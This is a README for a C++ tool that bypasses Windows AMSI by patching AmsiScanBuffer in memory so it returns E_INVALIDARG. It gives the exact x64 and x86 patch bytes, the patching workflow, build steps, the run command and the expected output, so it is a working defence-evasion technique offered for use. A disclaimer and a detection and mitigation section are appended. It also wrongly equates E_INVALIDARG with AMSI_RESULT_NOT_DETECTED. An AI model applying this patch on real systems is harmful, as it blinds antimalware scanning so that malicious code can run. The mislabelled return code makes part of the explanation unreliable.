# AMSI Bypass Using Adam Chester Patch

A modern C++ implementation of an AMSI (Antimalware Scan Interface) bypass technique using memory patching to disable the `AmsiScanBuffer` function.

## Overview

This project demonstrates how to bypass Windows AMSI by directly patching the `AmsiScanBuffer` function in memory with a minimal set of assembly instructions that force the function to return `AMSI_RESULT_NOT_DETECTED` (0x80070057 - E_INVALIDARG). This technique, known as the "Adam Chester Patch", is one of the most straightforward and effective AMSI bypass methods.

## How It Works

1. **Module Location**: Locates or loads `amsi.dll` in the current process
2. **Function Address**: Retrieves the address of `AmsiScanBuffer` function
3. **Memory Protection**: Changes memory protection to `PAGE_EXECUTE_READWRITE` 
4. **Patching**: Writes architecture-specific assembly patch to the function's entry point
5. **Protection Restoration**: Restores original memory protection flags

## Technical Details

### Patch Bytes

**x64 Architecture:**
```assembly
B8 57 00 07 80    ; mov eax, 0x80070057 (E_INVALIDARG)
C3                ; ret
```

**x86 Architecture:**
```assembly
B8 57 00 07 80    ; mov eax, 0x80070057 (E_INVALIDARG)
C2 18 00          ; ret 0x18
```

### Key Components

- **Architecture Detection**: Automatically detects x86/x64 architecture and WoW64 processes
- **Memory Manipulation**: Uses `VirtualProtect` and `WriteProcessMemory` for safe patching
- **Error Handling**: Comprehensive error checking and reporting
- **Minimal Footprint**: Uses only 6 bytes (x64) or 8 bytes (x86) to patch the function

### Workflow

```
Load/Find amsi.dll
    ↓
Get AmsiScanBuffer address
    ↓
Change memory protection (PAGE_EXECUTE_READWRITE)
    ↓
Write patch bytes (mov eax, 0x80070057; ret)
    ↓
Restore memory protection
    ↓
AmsiScanBuffer now returns E_INVALIDARG (AMSI bypassed)
```

## Building

### Requirements

- Visual Studio 2019 or later
- Windows SDK
- C++17 or later

### Build Instructions

1. Open `Adam Chester Patch.sln` in Visual Studio
2. Select **Release** configuration and **x64** platform (or x86 if needed)
3. Build the solution (Ctrl+Shift+B)
4. The executable will be generated in the build output directory

## Usage

Simply run the compiled executable:

```powershell
.\x64\Release\"Adam Chester Patch.exe"
```

The program will:
1. Detect the system architecture (x86/x64/WoW64)
2. Locate `amsi.dll` and `AmsiScanBuffer`
3. Apply the appropriate patch for the detected architecture
4. Report success or failure

### Expected Output

```
Iniciando AMSI Bypass (Adam Chester Patch)...
Arquitetura x64 detectada
AmsiScanBuffer encontrado em: 0x<address>
Patch aplicado com sucesso! (6 bytes escritos)
AMSI Bypass concluído com sucesso!
```

## Code Structure

```cpp
main.cpp
├── Patch namespace              // Architecture-specific patch definitions
│   ├── x64                     // 6-byte x64 patch
│   └── x86                     // 8-byte x86 patch
├── AdamChesterPatchAmsi()      // Main patching function
│   ├── Module loading/location
│   ├── Function address resolution
│   ├── Memory protection modification
│   ├── Patch application
│   └── Protection restoration
└── main()                      // Entry point with architecture detection
```

## Why This Works

The patch modifies `AmsiScanBuffer` to immediately return `E_INVALIDARG` (0x80070057), which Windows interprets as "AMSI not available" or "invalid scan parameters". When AMSI receives this error code, it assumes the scan cannot be performed and allows the content to execute without scanning.

This is significantly simpler than other bypass methods because:
- No exception handling required
- No thread context manipulation needed
- Minimal bytes to patch (6-8 bytes)
- Works across all Windows versions with AMSI

## References and Credits

This implementation is inspired by and references the following research:

### 1. Adam Chester's Original Research
**Adam Chester Patch**
- Reference: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell - Adam Chester Patch](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Adam-Chester-Patch)
- Researcher: Adam Chester (@_xpn_)
- Description: The original memory patching technique that forces `AmsiScanBuffer` to return E_INVALIDARG

### 2. Original Post
- Author: Adam Chester (@_xpn_)
- Post: [https://x.com/_xpn_/status/1170852932650262530](https://x.com/_xpn_/status/1170852932650262530)
- Research on AMSI internals and bypass techniques

## Educational Purpose

⚠️ **DISCLAIMER**: This project is for **educational and research purposes only**. It demonstrates security research concepts and should only be used in controlled environments with proper authorization. Unauthorized use of these techniques may violate laws and regulations.

## Detection and Mitigation

### Detection Strategies
- Monitor for calls to `VirtualProtect` on `amsi.dll` memory regions
- Detect modifications to `AmsiScanBuffer` function prologue
- Hash verification of critical AMSI functions
- Memory integrity checks on AMSI module
- ETW (Event Tracing for Windows) monitoring for suspicious memory operations

### Mitigation Approaches
- Kernel-level AMSI implementation
- Protected Process Light (PPL) for AMSI provider
- Code signing verification for memory modifications
- Enhanced logging and alerting on AMSI function tampering
- Periodic integrity checks of AMSI function bytes

## License

This project is provided as-is for educational purposes. Use responsibly and ethically.

## Contributing

Contributions, suggestions, and improvements are welcome. Please ensure any modifications maintain the educational focus of this project.

---

**Last Updated**: December 2025
